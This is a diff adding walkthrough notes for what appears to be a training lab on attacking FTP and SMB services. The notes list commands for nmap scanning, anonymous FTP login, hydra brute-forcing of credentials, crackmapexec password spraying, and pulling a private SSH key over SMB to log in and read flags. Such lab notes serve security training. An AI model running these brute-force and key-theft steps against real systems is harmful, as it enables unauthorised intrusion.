@@ -1,0 +1,42 @@
+# Attacking FTP
+Enumerate the target
+sudo nmap -sC -sV <Target IP>
+FTP open on port 2***
+*Apparently sometimes the port 2*** doesn't show up during the scan, if that happens, restart the Target VM*
+
+Anonymously log into the target via ftp
+ftp anonymous@<Target IP> -p 2***
+
+Check for files with ls
+
+Download the users.list and passwords.list
+get users.list
+get passwords.list
+
+Use hidra to brute force the username and password, this will take a few minutes
+hydra -L users.list -P passwords.list ftp://<Target IP>:2***
+
+Found username and password
+
+use the new username and password to ssh into the Target
+ssh r****@<Target Ip>
+
+Find the flag on the machine using ls
+cat flag.txt
+
+# Attacking SMB
+For the first question, 
+use smbmap -H <Target IP>
+*Look for the one with read only permissions*
+
+For the second question, 
+sudo crackmapexec smb <Target Ip> -u jason -p pws.list --local-auth
+*pws.list is in the resources section on the top of the page*
+
+For the third question, 
+smbclient //<Target IP>/G** -U jason
+get id_rsa
+open new terminal where id_rsa was downloaded, then chmod 600 id_rsa
+ssh -i id_rsa jason@<Target IP>
+cat flag.txt
+
